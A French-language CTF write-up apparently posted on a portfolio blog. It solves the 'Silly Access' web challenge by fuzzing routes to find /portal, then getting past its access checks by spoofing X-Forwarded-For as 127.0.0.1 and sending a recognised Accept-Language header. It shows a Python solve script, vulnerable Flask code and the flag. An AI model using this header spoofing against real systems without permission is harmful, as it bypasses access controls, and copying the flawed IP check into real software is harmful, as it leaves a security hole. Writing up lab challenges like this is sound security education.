---
layout: post
title: "ECOWAS CTF 2026 — Silly Access [Web/200pts]"
date: 2026-04-24 10:50:00 +0000
categories: [CTF, ECOWAS-CTF-2026]
tags: [web, header-spoofing, x-forwarded-for, accept-language, access-control, flask, ecowas-languages]
toc: true
---

> **CTF :** ECOWAS CTF 2026 · **Catégorie :** Web · **Difficulté :** ⭐⭐ (Medium) · **Points :** 200  
> **[← Retour à l'index du CTF](/portfolio/blog/posts/ecowas-ctf-2026/)**

---

## Informations

| Champ                 | Valeur                                                 |
| --------------------- | ------------------------------------------------------ |
| **CTF**         | ECOWAS CTF 2026 — Phase 2 (Drop 19H00, 10 Avril 2026) |
| **Catégorie**  | Web                                                    |
| **Points**      | 200                                                    |
| **Difficulté** | Medium                                                 |
| **URL**         | `http://labs.ctfzone.com:5003/`                      |
|                       |                                                        |

## Description

> A junior delegate left the restriction logic in a very trusting state.
> My language is your language but sometimes we communicate it at foreign countries!

## Analyse

### Décomposer la description

- **"restriction logic in a very trusting state"** → L'application fait confiance naïvement à certains headers HTTP (pattern classique : SSRF bypass, IP spoofing via `X-Forwarded-For`)
- **"My language is your language"** → Il faut présenter une **langue** (header `Accept-Language`)
- **"foreign countries"** → La langue doit être "étrangère" au point de vue du serveur, mais reconnue

### Observation comportementale

La racine `/` renvoie un **200 avec body vide** pour toutes les requêtes. L'app Flask existe mais ne renvoie rien de visible.

→ Il y a sûrement d'autres **routes** cachées.

### Directory fuzzing — l'étape clé

Avec des wordlists standards (SecLists `common.txt`), on découvre :

```
GET /portal → 403 Forbidden
```

Le `/portal` existe mais renvoie 403 avec un message d'erreur double :

```json
{
  "error": "Access denied - suspicious IP",
  "hint": "This portal only accepts local connections"
}
```

ET :

```json
{
  "error": "Unsupported language",
  "hint": "We only serve delegates in recognized ECOWAS languages"
}
```

Deux restrictions simultanées :

1. **Restriction IP** : le serveur n'accepte que `127.0.0.1` (localhost)
2. **Restriction langue** : doit fournir un header `Accept-Language` reconnu (langue ECOWAS : `fr`, `en`, `pt`)

## Solution

### Double bypass

L'app Flask fait confiance au header `X-Forwarded-For` (typique quand une appli est derrière un reverse proxy — elle trusts ce header sans validation) et vérifie `Accept-Language`.

```python
import requests

r = requests.get(
    'http://labs.ctfzone.com:5003/portal',
    headers={
        'X-Forwarded-For': '127.0.0.1',   # Spoofing IP locale
        'Accept-Language': 'fr',            # Langue ECOWAS reconnue
    }
)
print(r.json())
```

**Réponse :**

```json
{
  "flag": "EcowasCTF{h34d3rs_sp00f3d_dipl0m@t_@ccess}",
  "message": "Welcome, trusted delegate. Access granted to the 'portal'",
  "status": "granted"
}
```

## Pourquoi ça marche ?

### X-Forwarded-For spoofing

Le header `X-Forwarded-For` est ajouté par les proxies/load balancers pour indiquer l'IP d'origine du client. Quand une app Flask vérifie l'IP avec `request.remote_addr` via un proxy, elle peut voir l'IP du proxy au lieu de l'IP client. Certains développeurs utilisent alors `request.headers.get('X-Forwarded-For')` à la place — mais ce header peut être **forgé par n'importe qui** !

```python
# Code vulnérable Flask  :
ip = request.headers.get('X-Forwarded-For', request.remote_addr)
if ip != '127.0.0.1':
    return jsonify({"error": "Access denied"})
```

Il suffit d'envoyer `X-Forwarded-For: 127.0.0.1` pour bypasser.

### Accept-Language parsing

Flask (et Werkzeug) gèrent nativement le header `Accept-Language`. L'app vérifie si la langue demandée est dans une liste de langues ECOWAS autorisées (`fr`, `en`, `pt`).

## Script complet

```python
import requests

BASE = 'http://labs.ctfzone.com:5003'

# Étape 1 : Fuzzer les routes (avec wordlist)
# → Découverte de /portal (403)

# Étape 2 : Double bypass
r = requests.get(
    BASE + '/portal',
    headers={
        'X-Forwarded-For': '127.0.0.1',
        'Accept-Language': 'fr',
    }
)

data = r.json()
print(data['flag'])
```

## Processus de discovery

```
1. GET /          → 200 empty (app existe)
2. GET /portal    → 403 + double restriction hint
3. Bypass #1: X-Forwarded-For: 127.0.0.1
4. Bypass #2: Accept-Language: fr
5. GET /portal (avec les 2 headers) → 200 + FLAG
```

## Flag

```
EcowasCTF{h34d3rs_sp00f3d_dipl0m@t_@ccess}
```

## Ressources

- [OWASP — HTTP Header Injection](https://owasp.org/www-community/attacks/HTTP_Response_Splitting)
- [X-Forwarded-For spoofing — PortSwigger](https://portswigger.net/web-security/access-control/lab-admin-panel-behind-proxy)
- [SecLists — common.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt)
- [Flask request headers](https://flask.palletsprojects.com/en/3.0.x/api/#flask.Request.headers)

---

**[← Retour à l'index du CTF](/portfolio/blog/posts/ecowas-ctf-2026/)**
